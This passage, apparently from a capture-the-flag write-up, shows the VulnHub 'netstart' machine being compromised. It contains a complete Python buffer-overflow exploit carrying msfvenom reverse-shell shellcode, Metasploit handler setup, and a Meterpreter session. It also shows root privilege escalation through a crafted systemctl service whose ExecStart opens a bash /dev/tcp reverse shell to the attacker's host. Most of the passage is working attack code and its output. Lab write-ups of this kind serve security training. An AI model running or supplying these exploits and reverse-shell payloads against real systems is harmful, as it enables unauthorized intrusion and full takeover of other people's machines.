buf += b&quot;\x3b\x16\xcc\x8b\xa8\xc1\x7d\xc3\xf5\xc4\x09\x6e\xe2&quot;
buf += b&quot;\x3a\xfb\xc3\xe4\xcd\x16\xb7\xd5\xf6\x8b\x3a\x18\x88&quot;
buf += b&quot;\xd2\xb7\xc7\xad\x7d\x9a\x07\xf4\x25\xa4\xa8\xf9\xbd&quot;
buf += b&quot;\x49\x7b\xe9\xf7\x11\xa8\xf1\x7d\xc3\xf3\x7c\xb2\xe6&quot;
buf += b&quot;\x07\xae\xad\xa3\x7a\xaf\xa7\x3d\xc3\xaa\xa9\x98\xa8&quot;
buf += b&quot;\xe7\x1d\x4f\x7e\x9d\xc5\xf0\x23\xf5\x9e\xb5\x50\xc7&quot;
buf += b&quot;\xa9\x96\x4b\xb9\x81\xe4\x24\x0a\x23\x7a\xb3\xf4\xf6&quot;
buf += b&quot;\xc2\x0a\x31\xa2\x92\x4b\xdc\x76\xa9\x23\x0a\x23\x92&quot;
buf += b&quot;\x73\xa5\xa6\x82\x73\xb5\xa6\xaa\xc9\xfa\x29\x22\xdc&quot;
buf += b&quot;\x20\x61\xa8\x26\x9d\x36\x6a\x1a\xf1\x9e\xc0\x23\xe4&quot;
buf += b&quot;\xaa\x4b\xc5\x9f\xe6\x94\x74\x9d\x6f\x67\x57\x94\x09&quot;
buf += b&quot;\x17\xa6\x35\x82\xce\xdc\xbb\xfe\xb7\xcf\x9d\x06\x77&quot;
buf += b&quot;\x81\xa3\x09\x17\x4b\x96\x9b\xa6\x23\x7c\x15\x95\x74&quot;
buf += b&quot;\xa2\xc7\x34\x49\xe7\xaf\x94\xc1\x08\x90\x05\x67\xd1&quot;
buf += b&quot;\xca\xc3\x22\x78\xb2\xe6\x33\x33\xf6\x86\x77\xa5\xa0&quot;
buf += b&quot;\x94\x75\xb3\xa0\x8c\x75\xa3\xa5\x94\x4b\x8c\x3a\xfd&quot;
buf += b&quot;\xa5\x0a\x23\x4b\xc3\xbb\xa0\x84\xdc\xc5\x9e\xca\xa4&quot;
buf += b&quot;\xe8\x96\x3d\xf6\x4e\x06\x77\x81\xa3\x9e\x64\xb6\x48&quot;
buf += b&quot;\x6b\x3d\xf6\xc9\xf0\xbe\x29\x75\x0d\x22\x56\xf0\x4d&quot;
buf += b&quot;\x85\x30\x87\x99\xa8\x23\xa6\x09\x17&quot;</code></pre><p id="8fb5e993-8cce-4092-94bd-a226e4f7e129" class="">
</p><p id="0e979f64-506d-4a6a-9064-16193bf47861" class="">Exploit script:</p><p id="a283b041-ba77-4647-a444-07f305a35408" class="">
</p><pre id="d4f92d6e-016b-4915-a32e-c7f9f305da23" class="code code-wrap"><code>#!/usr/bin/env python3

import socket
import sys
import struct


ip = &quot;192.168.57.11&quot;
port = 2371
timeout = 5
total_length = 2000
offset = 1702
new_eip = struct.pack(&quot;&lt;I&quot;, 0x625012B8)
buf =  b&quot;&quot;
buf += b&quot;\x2b\xc9\xb1\x51\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73&quot;
buf += b&quot;\x13\x23\xf5\xf6\xc2\x83\xeb\xfc\xe2\xf4\xdf\x1d\x74&quot;
buf += b&quot;\xc2\x23\xf5\x96\x4b\xc6\xc4\x36\xa6\xa8\xa5\xc6\x49&quot;
buf += b&quot;\x71\xf9\x7d\x90\x37\x7e\x84\xea\x2c\x42\xbc\xe4\x12&quot;
buf += b&quot;\x0a\x5a\xfe\x42\x89\xf4\xee\x03\x34\x39\xcf\x22\x32&quot;
buf += b&quot;\x14\x30\x71\xa2\x7d\x90\x33\x7e\xbc\xfe\xa8\xb9\xe7&quot;
buf += b&quot;\xba\xc0\xbd\xf7\x13\x72\x7e\xaf\xe2\x22\x26\x7d\x8b&quot;
buf += b&quot;\x3b\x16\xcc\x8b\xa8\xc1\x7d\xc3\xf5\xc4\x09\x6e\xe2&quot;
buf += b&quot;\x3a\xfb\xc3\xe4\xcd\x16\xb7\xd5\xf6\x8b\x3a\x18\x88&quot;
buf += b&quot;\xd2\xb7\xc7\xad\x7d\x9a\x07\xf4\x25\xa4\xa8\xf9\xbd&quot;
buf += b&quot;\x49\x7b\xe9\xf7\x11\xa8\xf1\x7d\xc3\xf3\x7c\xb2\xe6&quot;
buf += b&quot;\x07\xae\xad\xa3\x7a\xaf\xa7\x3d\xc3\xaa\xa9\x98\xa8&quot;
buf += b&quot;\xe7\x1d\x4f\x7e\x9d\xc5\xf0\x23\xf5\x9e\xb5\x50\xc7&quot;
buf += b&quot;\xa9\x96\x4b\xb9\x81\xe4\x24\x0a\x23\x7a\xb3\xf4\xf6&quot;
buf += b&quot;\xc2\x0a\x31\xa2\x92\x4b\xdc\x76\xa9\x23\x0a\x23\x92&quot;
buf += b&quot;\x73\xa5\xa6\x82\x73\xb5\xa6\xaa\xc9\xfa\x29\x22\xdc&quot;
buf += b&quot;\x20\x61\xa8\x26\x9d\x36\x6a\x1a\xf1\x9e\xc0\x23\xe4&quot;
buf += b&quot;\xaa\x4b\xc5\x9f\xe6\x94\x74\x9d\x6f\x67\x57\x94\x09&quot;
buf += b&quot;\x17\xa6\x35\x82\xce\xdc\xbb\xfe\xb7\xcf\x9d\x06\x77&quot;
buf += b&quot;\x81\xa3\x09\x17\x4b\x96\x9b\xa6\x23\x7c\x15\x95\x74&quot;
buf += b&quot;\xa2\xc7\x34\x49\xe7\xaf\x94\xc1\x08\x90\x05\x67\xd1&quot;
buf += b&quot;\xca\xc3\x22\x78\xb2\xe6\x33\x33\xf6\x86\x77\xa5\xa0&quot;
buf += b&quot;\x94\x75\xb3\xa0\x8c\x75\xa3\xa5\x94\x4b\x8c\x3a\xfd&quot;
buf += b&quot;\xa5\x0a\x23\x4b\xc3\xbb\xa0\x84\xdc\xc5\x9e\xca\xa4&quot;
buf += b&quot;\xe8\x96\x3d\xf6\x4e\x06\x77\x81\xa3\x9e\x64\xb6\x48&quot;
buf += b&quot;\x6b\x3d\xf6\xc9\xf0\xbe\x29\x75\x0d\x22\x56\xf0\x4d&quot;
buf += b&quot;\x85\x30\x87\x99\xa8\x23\xa6\x09\x17&quot;
shellcode = buf
nop_sled = b&quot;\x90&quot; * 32

# string = b&quot;A&quot; * offset + new_eip + all_characters + b&quot;C&quot; * (total_length - offset - len(new_eip) - len(all_characters))
string = b&quot;A&quot; * offset + new_eip + nop_sled + shellcode + b&quot;C&quot; * (total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode))

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print(&quot;Sending Evil Buffer&quot;.format(len(string)))
      s.send(string)
      s.recv(1024)
except:
    sys.exit(0)</code></pre><p id="11b3ad7c-80d4-498d-9cfa-19ec54fd5340" class="">
</p><p id="f5195013-fd05-42d0-99a0-f3de30c09a44" class="">We will restart the process in Immunity Debugger. We will setup a listener to catch the shell.</p><p id="4eacb023-fdd8-4586-89e7-c0ff17a10824" class="">
</p><pre id="2fb6c3f3-88c8-4bbe-b649-051835b6579b" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]
‚îî‚îÄ# msfconsole
.                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       &#x27;   dB&#x27;                     BBP
    dB&#x27;dB&#x27;dB&#x27; dBBP     dBP     dBP BB
   dB&#x27;dB&#x27;dB&#x27; dBP      dBP     dBP  BB
  dB&#x27;dB&#x27;dB&#x27; dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB&#x27; dBP    dB&#x27;.BP
                             |       dBP    dBBBB&#x27; dBP    dB&#x27;.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB&#x27;.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.0.45-dev                          ]
+ -- --=[ 2134 exploits - 1139 auxiliary - 364 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: When in a module, use back to go 
back to the top level prompt

msf6 &gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set PAYLOAD windows/shell_reverse_tcp
PAYLOAD =&gt; windows/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set LHOST 192.168.57.4
LHOST =&gt; 192.168.57.4
msf6 exploit(multi/handler) &gt; set LPORT 4444
LPORT =&gt; 4444
msf6 exploit(multi/handler) &gt; exploit

[*] Started reverse TCP handler on 192.168.57.4:4444</code></pre><p id="c93b4993-788d-45e8-969d-531a63fca5cf" class="">
Now we will execute the script.</p><p id="2c83c28b-fd22-410a-810a-8c5cfda6dd4e" class="">
</p><pre id="c8ec210f-c60e-4919-adb3-4108d1dce63f" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# python3 exploit.py</code></pre><p id="4fdb35d2-7104-4fb2-ba53-2e718aa47ff4" class="">

We received the shell.</p><p id="0fa3b8ad-5cdc-4339-8660-62eaec22f446" class="">
</p><pre id="a152df0a-5797-40be-b0b5-4a02009e001f" class="code"><code>[*] Command shell session 1 opened (192.168.57.4:4444 -&gt; 192.168.57.11:49271) at 2023-02-23 06:31:27 -0500

C:\Temp\netstart&gt;
C:\Temp\netstart&gt;whoami
whoami
win7x86\vhacker</code></pre><p id="71897aec-d42d-4baa-93d2-e76cc9826ede" class="">
</p><p id="c055c836-d134-4927-abae-00a82530d527" class="">Now we will change the IP address and try to exploit the machine ‚Äònetstart‚Äô. We need to also change the payload since the target machine has linux.</p><p id="8f0a445b-842d-4d7e-bdf9-25bb404f8288" class="">
</p><pre id="9ec1461f-a590-4105-9117-5658569017bc" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.57.4 LPORT=4444 -f py -b &quot;\x00\x2d\x2e\x46\x47\x59\x5e\x60&quot;
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 150 (iteration=0)
x86/shikata_ga_nai chosen with final size 150
Payload size: 150 bytes
Final size of py file: 743 bytes
buf =  b&quot;&quot;
buf += b&quot;\xdd\xc7\xbe\x55\x91\xe7\x35\xd9\x74\x24\xf4\x58\x29&quot;
buf += b&quot;\xc9\xb1\x1f\x83\xc0\x04\x31\x70\x16\x03\x70\x16\xe2&quot;
buf += b&quot;\xa0\xfb\xed\x6b\x7b\x27\x06\x70\x28\x94\xba\x1d\xcc&quot;
buf += b&quot;\xaa\x5b\x6b\x31\x07\x23\xfc\xea\xf0\xe4\xab\x35\x05&quot;
buf += b&quot;\x8d\xa9\x45\x14\x11\x27\xa4\x7c\xcf\x6f\x76\xd0\x58&quot;
buf += b&quot;\x19\x97\x91\xab\x99\xd2\xd6\x4d\x83\x92\xa2\x90\xdb&quot;
buf += b&quot;\x88\x4b\xeb\x1b\x94\x21\xeb\x71\x21\x3f\x08\xb4\xe0&quot;
buf += b&quot;\xf2\x4f\x32\x32\x75\xed\xd6\x95\x34\x0a\x90\xd9\x28&quot;
buf += b&quot;\x15\xe2\x50\xab\xd4\x09\x6e\xed\x34\xc1\xde\x90\x77&quot;
buf += b&quot;\x5a\x9b\xab\xf0\x4b\xf8\xa2\xe0\xf5\x4c\xde\x52\x06&quot;
buf += b&quot;\x7d\x9f\x16\xc9\x05\xa2\xe7\x2b\x4d\xa3\x17\xac\xad&quot;
buf += b&quot;\x1f\x16\xac\xad\x5f\xd4\x2c&quot;</code></pre><p id="6518cfe7-b212-4be4-84cb-045111d33031" class="">
</p><p id="1e3bd4af-ffd5-49c8-a8e3-cd98f00225ae" class="">Now we will execute the script after changing the IP address and the payload.</p><p id="098a614f-a737-475d-b463-ae3c0faf0c72" class="">
</p><pre id="c9d1d183-5453-49a3-a959-c130fa131b3b" class="code code-wrap"><code>#!/usr/bin/env python3

import socket
import sys
import struct


ip = &quot;192.168.57.13&quot;
port = 2371
timeout = 5
total_length = 2000
offset = 1702
new_eip = struct.pack(&quot;&lt;I&quot;, 0x625012B8)
buf =  b&quot;&quot;
buf += b&quot;\xbb\xf8\xaa\x14\xc0\xd9\xcf\xd9\x74\x24\xf4\x5f\x29&quot;
buf += b&quot;\xc9\xb1\x1f\x31\x5f\x15\x83\xc7\x04\x03\x5f\x11\xe2&quot;
buf += b&quot;\x0d\xc0\x1e\x9e\xdc\xce\xe8\xfd\x4d\xb2\x45\x68\x73&quot;
buf += b&quot;\x84\x0c\xe5\x92\x29\x50\x62\x0f\xda\x91\x25\x96\x17&quot;
buf += b&quot;\x7a\x34\xe8\x32\xc9\xb1\x09\x56\x4b\x9a\x99\xf6\xc4&quot;
buf += b&quot;\x93\xf8\xba\x27\x23\x7f\xfc\xc1\x3d\x31\x89\x0c\x56&quot;
buf += b&quot;\x6f\x71\x6f\xa6\x37\x18\x6f\xcc\xc2\x55\x8c\x21\x05&quot;
buf += b&quot;\xa8\xd3\xc7\x55\x4a\x69\x2c\x72\x1f\x96\x0a\x7c\x4f&quot;
buf += b&quot;\x99\x6c\xf5\x8c\x58\x87\x09\x92\xb8\x54\xa1\x69\xf2&quot;
buf += b&quot;\xe5\x44\x51\x74\xf6\x1d\xdb\x64\x6f\x13\xb1\xd6\x93&quot;
buf += b&quot;\x9e\xc6\x92\x54\x58\xc5\x63\xb5\x20\xc8\x9b\x36\x50&quot;
buf += b&quot;\x70\x9a\x36\x50\x86\x50\xb6&quot;

shellcode = buf
nop_sled = b&quot;\x90&quot; * 32

# string = b&quot;A&quot; * offset + new_eip + all_characters + b&quot;C&quot; * (total_length - offset - len(new_eip) - len(all_characters))
string = b&quot;A&quot; * offset + new_eip + nop_sled + shellcode + b&quot;C&quot; * (total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode))

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print(&quot;Sending Evil Buffer&quot;.format(len(string)))
      s.send(string)
      s.recv(1024)
except:
    sys.exit(0)</code></pre><p id="c5a42fe5-3145-4790-aa1a-47ae02875873" class="">
</p><pre id="03df9438-5f77-4527-9a67-696713fda8f1" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# msfconsole</code></pre><p id="2337e011-9c27-4722-9cf2-4596703a68df" class="">
</p><pre id="ebd2ca37-915c-4ea8-a344-876c7b8f5386" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# python3 exploit.py
Sending Evil Buffer</code></pre><p id="8f939bdb-3f92-49e1-b4ae-5768c9d84f0c" class="">
</p><pre id="1203efec-63cb-435b-9597-52bad644b3a5" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# msfconsole
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;&#x27; /
                         `.  ,&#x27;/ .&#x27;
                          `. X /.&#x27;
                .-;--&#x27;&#x27;--.._` ` (
              .&#x27;            /   `
             ,           ` &#x27;   Q &#x27;
             ,         ,   `._    \
          ,.|         &#x27;     `-.;_&#x27;
          :  . `  ;    `  ` --,.._;
           &#x27; `    ,   )   .&#x27;
              `._ ,  &#x27;   /_
                 ; ,&#x27;&#x27;-,;&#x27; ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v6.0.45-dev                          ]
+ -- --=[ 2134 exploits - 1139 auxiliary - 364 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: To save all commands executed since start up 
to a file, use the makerc command

msf6 &gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD =&gt; linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set LPORT 4444
LPORT =&gt; 4444
msf6 exploit(multi/handler) &gt; set LHOST 192.168.57.4
LHOST =&gt; 192.168.57.4
msf6 exploit(multi/handler) &gt; exploit

[*] Started reverse TCP handler on 192.168.57.4:4444</code></pre><p id="685adbce-0f8a-4333-a1f1-dba62374dde4" class="">We will now execute the Python script.</p><p id="df91c00d-70d0-48ef-a76a-b692a0dbb20c" class="">
</p><pre id="d9779044-20ff-4d46-9a03-b75558d0297a" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# python3 exploit.py
Sending Evil Buffer</code></pre><p id="18117acc-c1a3-4cfb-9b00-5817cb5b1e37" class="">
</p><p id="f41d8848-2d66-4a79-a9ef-469209d92962" class="">Reverse Shell:</p><pre id="7c0ec17c-76e3-4c57-8b7b-cddc4960e314" class="code"><code>[] Sending stage (984904 bytes) to 192.168.57.13
[] Meterpreter session 1 opened (192.168.57.4:4444 -&gt; 192.168.57.13:48722) at 2023-02-23 08:15:46 -0500
meterpreter &gt; sysinfo
Computer     : 192.168.57.13
OS           : Debian 10.6 (Linux 4.19.0-11-amd64)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter &gt; getuid
Server username: fox @ netstart (uid=1001, gid=1001, euid=1001, egid=1001)
meterpreter &gt; shell
Process 738 created.
Channel 1 created.
id
uid=1001(fox) gid=1001(fox) groups=1001(fox)
ls
AppData
Application Data
Contacts
Cookies
Desktop
Downloads
Favorites
Links
Local Settings
My Documents
My Music
My Pictures
My Videos
NetHood
PrintHood
Recent
Saved Games
Searches
SendTo
Start Menu
Temp
Templates
pwd
/home/fox/.wine/drive_c/users/fox
ls -latr /home/fox
total 28
drwxr-xr-x 3 fox  fox  4096 Nov 16  2020 .config
drwxr-xr-x 4 root root 4096 Nov 16  2020 ..
-rwxr-xr-x 1 fox  fox   114 Nov 16  2020 startup
lrwxrwxrwx 1 fox  fox     9 Nov 16  2020 .bash_history -&gt; /dev/null
-rw-r--r-- 1 fox  fox    33 Nov 16  2020 local.txt
drwxr-xr-x 3 fox  fox  4096 Nov 16  2020 .cache
drwxr-xr-x 5 fox  fox  4096 Nov 16  2020 .
drwxr-xr-x 4 fox  fox  4096 Feb 23 12:31 .wine
cat /home/fox/local.txt
75894c2b3d5c3b78372af63694cdc659</code></pre><h2 id="9379c616-8027-4e99-b1c9-7acc133de31d" class="">
<mark class="highlight-blue">Privilege Escalation</mark></h2><p id="05652550-f0df-47ce-ae08-e24bc5fb129d" class="">
</p><pre id="1033af48-a726-4e68-bd54-bd7613754f26" class="code"><code>sudo -l
Matching Defaults entries for fox on netstart:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fox may run the following commands on netstart:
    (root) NOPASSWD: /usr/bin/systemctl</code></pre><p id="7fe3671f-5a52-47f2-a511-54c41e95c8af" class="">
</p><p id="e89bf6e9-60f2-4b47-9974-a344cf79e383" class="">The user fox can run systemctl command with root privileges.</p><p id="2c4728e6-a981-4703-be67-905004bf9b90" class="">
</p><p id="620ac040-8c96-4d01-aac1-23230acdaae1" class="">We have the following articles online for privilege escalation.</p><p id="bf6a4e14-9fca-4aa2-84b1-fd7130c5ade6" class="">
</p><figure id="c0755649-daed-487f-a5cd-01adc623c810"><a href="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Privilege Escalation: Leveraging misconfigured systemctl permissions</div><div class="bookmark-description">The binary, systemctl, is a process that exists in linux operating systems that is used to start different services, such as apache‚Ä¶</div></div><div class="bookmark-href"><img src="https://miro.medium.com/fit/c/152/152/1*sHhtYhaCe2Uc3IU0IgKwIQ.png" class="icon bookmark-icon"/>https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49</div></div><img src="https://miro.medium.com/max/1200/1*cr6cGCsiyKh6xxB7XaBYCA.png" class="bookmark-image"/></a></figure><p id="ad87e317-f33f-4bf1-9c50-89ec671f7542" class="">
For this we need to create a file with the following content.</p><p id="88eaaa36-c9cb-4703-9cbc-9de5d23f7539" class="">
</p><pre id="937a427d-41cb-4ba8-8860-921cdcc0a296" class="code code-wrap"><code>[Unit]
Description=shell.service

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.57.4/9999 0&gt;&amp;1&#x27;

[Install]
WantedBy=multi-user.target</code></pre><p id="71bc596d-f7c6-483c-8596-1f7343e0afd2" class="">
Let‚Äôs name this file shell.service</p><p id="a8c10652-ad2d-4e4e-9d9c-ef3e4bfbe6ba" class="">
</p><pre id="855386d2-c8b6-4e9f-9c6b-9f3abcd86809" class="code"><code>meterpreter &gt; background
[*] Backgrounding session 1..

msf6 exploit(multi/handler) &gt; vim shell.service                                                                                                                                                                                              
[*] exec: vim shell.service                                                                                                                                                                                                                  
                                                                                                                                                                                                                                             
msf6 exploit(multi/handler) &gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &gt; upload shell.service
[*] uploading  : /root/vulnhub/netstart/shell.service -&gt; shell.service
[*] Uploaded -1.00 B of 171.00 B (-0.58%): /root/vulnhub/netstart/shell.service -&gt; shell.service
[*] uploaded   : /root/vulnhub/netstart/shell.service -&gt; shell.service
meterpreter &gt; shell
Process 946 created.
Channel 2 created.
ls
AppData
Application Data
Contacts
Cookies
Desktop
Downloads
Favorites
Links
Local Settings
My Documents
My Music
My Pictures
My Videos
NetHood
PrintHood
Recent
Saved Games
Searches
SendTo
Start Menu
Temp
Templates
shell.service
mv shell.service /home/fox/temp/
cd /home/fox/temp
ls
shell.service
cat shell.service
[Unit]
Description=shell.service

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.57.4/9999 0&gt;&amp;1&#x27;

[Install]
WantedBy=multi-user.target</code></pre><p id="13903bd3-e59a-4024-99c7-d47361f4ac8b" class="">
</p><p id="f81aceb9-71e3-4078-8336-22328d6d9128" class="">Now we will configure a listener to listen on port 9999.</p><p id="1755cb1d-46f0-4185-9d65-deb5a40cba76" class="">
</p><pre id="e995ef45-d94f-4bf9-b5f5-96d89fe9bed5" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]
‚îî‚îÄ# nc -nvlp 9999
listening on [any] 9999 ...</code></pre><p id="8c7d6101-51fc-44cd-badb-bfe0c3fcaae4" class="">
Now we will run the following command.</p><p id="0d2b847f-c5b1-4d6d-9bbd-bc222e490119" class="">
</p><pre id="0aa2d694-f8a5-4648-a7d3-8b8380a5c9e2" class="code"><code>sudo /usr/bin/systemctl enable /home/fox/temp/shell.service
Created symlink /etc/systemd/system/multi-user.target.wants/shell.service -&gt; /home/fox/temp/shell.service.
sudo /usr/bin/systemctl start shell.service</code></pre><p id="1aa382bf-5856-49e4-991f-474386ff7788" class="">
</p><p id="19bb57fb-ecb6-4c61-b0c6-bb3a179986cf" class="">Now we receive a shell.</p><p id="4965354b-9f25-41cb-a03f-a48784eba678" class="">
</p><pre id="b51301ba-22cf-4a16-8f7e-a3b7223a30fd" class="code"><code>connect to [192.168.57.4] from (UNKNOWN) [192.168.57.13] 46988
bash: cannot set terminal process group (998): Inappropriate ioctl for device
bash: no job control in this shell
root@netstart:/# whoami
whoami
root
root@netstart:/# ls
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
root@netstart:/# cd /root
cd /root
root@netstart:~# ls
ls
proof.txt
win
root@netstart:~# cat proof.txt
cat proof.txt
f632f5eaffa5607c961e22ba40291ab7</code></pre></div></article></body></html>